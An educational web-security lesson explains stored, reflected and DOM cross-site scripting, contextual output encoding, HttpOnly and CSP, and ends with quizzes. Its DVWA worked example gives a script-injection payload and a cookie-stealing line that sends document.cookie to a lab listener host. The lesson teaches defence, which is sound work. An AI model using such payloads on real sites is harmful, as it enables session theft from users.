---
id: m2_02_xss_types_fixes
courseCode: PBCST604
module: 2
sequence: 2
title: 'XSS: Stored, Reflected & DOM'
difficulty: beginner
estimatedMinutes: 4
learningObjectives:
  - Deliver scripts through stored, reflected and DOM flavours
  - Steal sessions through smuggled trust exactly once
  - Encode per context with HttpOnly blunts and CSP moats
concepts:
  - cross-site scripting
  - output encoding
  - content security policy
prerequisites: []
examRelevance: high
tags:
  - web-security
  - xss
---
# XSS: Stored, Reflected & DOM

**Scripts smuggled through trust — three delivery flavours, session theft, and output-encoding discipline.**

<a id="the-intuition"></a>
## 1. The Intuition

::: callout-intuition Core Mental Model: Poisoned Guestbook
**Stored** XSS carves graffiti into the site's own wall (comment/profile field) — every visitor reads attacker script served *by the trusted domain* (your browser obeys: same-origin!). **Reflected** hides the script in a link (victim clicks, server parrots it back unescaped — one-shot). **DOM** never touches the server (client JS writes `location.hash` into the page raw — the browser poisons itself). Payload goal classic: `document.cookie` to attacker ears (session ride-off), keylogging, defacement.
:::

::: anim xss-flow Poison, Serve, Steal
Attacker plants, site serves, victim executes — then the cookie sails home. Same-origin trust is the courier.
:::

---

<a id="the-math"></a>
## 2. Theoretical Framework & Formalism

### 2.1 Flavours + fixes

* Stored (persistent, mass victims) / reflected (link-borne, social-engineered) / DOM (client-sink, server-blind).
* Fixes: **contextual output encoding** (HTML/attribute/JS/CSS encoders per sink — one encoder ≠ all!), input validation (allow-lists), HttpOnly cookies (theft-blunting, not fixing), CSP headers (script-src allow-lists, last-line moat).

::: callout-formula KTU Formula Vault: XSS
Trust + **unescaped echo** = execution · fix = **encode per context** · HttpOnly **blunts**, CSP **moats**.
:::

::: callout-pitfall One Encoder Everywhere Fails
HTML-encoding inside a `<script>` sink leaves JS-string breakouts (`</script>`-less tricks, quote escapes) live — sink-matched encoders (JS-string, URL, CSS) per context. Encoder-context pairing is the fix detail graders check.
:::

---

<a id="worked-example"></a>
## 3. Worked Example / Step-by-Step Scenario

::: step [Step 1: Setup] Formulating the Problem
DVWA comment field echoes raw. (a) Prove stored XSS (benign alert). (b) Upgrade conceptually to cookie theft (lab-local receiver). (c) Fix stack (three layers)?
:::

::: step [Step 2: Execution] Graffiti, Exfil, Encode
1. Post `<script>alert(document.domain)</script>` → reload shows alert *from trusted origin* (origin line in alert proves context, not just popup).
2. Swap alert for `new Image().src='http://lab:8000/?c='+document.cookie` (lab listener logs; diagnosed HttpOnly absence if cookies arrive).
3. Output-encode per sink (HTML-encoder on echo) + HttpOnly on session cookies + CSP `script-src 'self'` — encode fixes, flags blunt, policy moats.
:::

::: step [Step 3: Conclusion] Final Result
Benign proof (domain-proving alert), impact demo (lab-local exfil), layered fix (encode/blunt/moat). Benign-first proof discipline (never live-theft beyond lab scope) is the ethics line in the writeup.
:::

---

<a id="self-check"></a>
## 4. Active Recall Quizzes

::: quiz Q1: Foundational Concept
Stored vs reflected XSS differ by:
(A) Script language
(*B) Persistence/delivery: stored lives server-side hitting every viewer (no victim click needed post-plant); reflected rides a crafted link per victim (needs the click, server parrots once)
(C) Severity always
(D) Browser exploited
::: explanation
Delivery changes blast radius (mass vs targeted) and evidence trails (server logs hold stored payloads indefinitely). Fix families overlap (encoding) but threat models diverge — state both halves.
:::

::: quiz Q2: Foundational Concept
HttpOnly cookies vs XSS:
(A) Prevents all XSS
(*B) Blocks *script reads* of cookies (theft via `document.cookie` dies) but not session riding (requests still carry cookies!) or other impacts (defacement, keylogging, actions) — mitigation, not cure
(C) Useless flag
(D) Encrypts traffic
::: explanation
Blunting, layered: theft dies, riding lives (attacker scripts act *as* you). Fix hierarchy stays: encode (cure) > HttpOnly (blunt theft) > CSP (moat) — order quoted, never substituted.
:::

::: quiz Q3: Foundational Concept
DOM XSS evades server-side filters because:
(A) Servers are slow
(*B) Taint flows entirely client-side (URL hash → JS sink like `innerHTML`) — server never sees the payload (fragment not even sent!); client-side review/CSP/DOM-safe APIs (textContent) are the fix surface
(C) Encryption hides it
(D) Firewalls miss JS
::: explanation
`#fragment` never leaves the browser — server logs/filters blind by protocol design. Client code audit (sources→sinks tracing) + safe sinks (`textContent` over `innerHTML`) relocate the battlefield to the browser.
:::
